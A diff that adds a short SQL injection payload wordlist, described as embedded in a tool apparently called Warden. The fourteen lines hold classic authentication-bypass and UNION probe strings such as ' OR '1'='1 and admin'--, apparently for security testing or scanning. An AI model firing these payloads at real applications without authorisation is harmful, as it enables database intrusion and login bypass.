@@ -1,0 +1,14 @@
+# SQL injection payload wordlist
+# Embedded in Warden binary
+
+' OR '1'='1
+" OR "1"="1
+' OR 1=1--
+" OR 1=1--
+' UNION SELECT NULL--
+" UNION SELECT NULL--
+' OR 1=1#
+" OR 1=1#
+admin'--
+" or "1"="1
+') OR '1'='1'--
